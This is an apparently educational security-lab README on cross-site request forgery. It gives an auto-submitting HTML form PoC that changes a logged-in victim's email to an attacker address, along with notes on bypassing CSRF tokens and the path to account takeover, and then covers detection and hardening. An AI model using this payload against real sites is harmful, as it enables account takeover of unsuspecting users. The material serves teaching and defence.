> **English** | [Italiano](README.md)

# CSRF - Cross-Site request forgery

> - **Phase:** Web exploitation - OWASP A01:2021 Broken Access Control
> - **Visibility:** Low - the request originates from the victim's browser and looks legitimate server-side
> - **Prerequisites:** a state-changing action (email/password change, transfer, settings change) protected only by the session cookie, with no valid anti-CSRF token or `SameSite`
> - **Nature of the document:** methodology + practical payloads for a lab environment. No fabricated Finding ID (next `WEB-016`, to assign in lab).

- Objective: make the authenticated victim's browser send, unknowingly, a request that changes state on the application (e.g., email/password change).

---

## Executive summary

CSRF exploits the fact that the browser automatically attaches session cookies to every request toward an
origin, even if the request starts from a third-party site. If a state-changing action is protected only by the
session (no anti-CSRF token nor `SameSite`), an attacker site can make that request fire from the logged-in
victim's browser. The impact depends on the action: from a settings change up to account takeover (email change
and password reset). Typical severity `Medium`, `High` when it leads to takeover.

## Execution / commands

### PoC: auto-submitting form (POST action)

A page hosted by the attacker; as soon as the victim (logged into the target) opens it, the form submits itself:

```html
<form action="https://target.lab/account/email" method="POST" id="x">
  <input type="hidden" name="email" value="attacker@evil.lab">
</form>
<script>document.getElementById('x').submit();</script>  <!-- changes the victim account's email -->
```

### Common token-protection bypasses

```
# token absent / not validated server-side -> remove it and the request passes
# predictable or reusable token -> reuse a known token
# token tied to the user but not the session -> use your own token on the victim
# JSON content-type but accepts text/plain -> CSRF form with enctype=text/plain forging the JSON body
```

Illustrative output:

```
HTTP/1.1 302 Found   # the action was performed with the victim's session
# account email changed to attacker@evil.lab -> takeover via password reset
```

## Analysis of results

If the action succeeds without the victim's conscious interaction, CSRF is confirmed. The impact rises to
`High`/account takeover when the action is an email/password change. If the app requires a session-bound
anti-CSRF token or sets `SameSite=Lax/Strict`, the vector is closed.

### Theoretical analysis

CSRF is a problem of **ambient authority**: the server authenticates based on something the browser sends
automatically (the cookie), not on proof that the user wanted the action. The countermeasure is to require proof
not automatically attached: a per-session anti-CSRF token, and/or `SameSite` cookies, and confirmation for
sensitive actions.

## Remediation (blue team)

**Detection.** State-changing requests with external or absent `Referer`/`Origin`; spikes of sensitive actions
without the expected token.

**Hardening.** Per-session anti-CSRF token validated server-side; `SameSite=Lax` (or `Strict`) cookies;
re-authentication for critical actions; never use GET for state-changing actions.

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - active | generates the csrf poc and checks token validation |
| `curl` | http client | cli - active | tests the request with no token / with an altered token |

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | abuse of a state-changing action lacking anti-csrf protection. |
| initial access | phishing: spearphishing link | `T1566.002` | delivery to the victim of the link to the page that triggers the forged request. |

---

## Links to other findings

| source | this technique | effect |
| :--- | :--- | :--- |
| [xss](<../xss (Cross-Site Scripting)/README.en.md>) | csrf | an xss on the target bypasses any csrf defense (same origin) |
| csrf | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.en.md>) | the remediation (token, samesite) links to secure coding |

---

> **Note:** Educational content. The PoCs must be used only on owned applications or with explicit authorization, in a lab. Illustrative outputs.
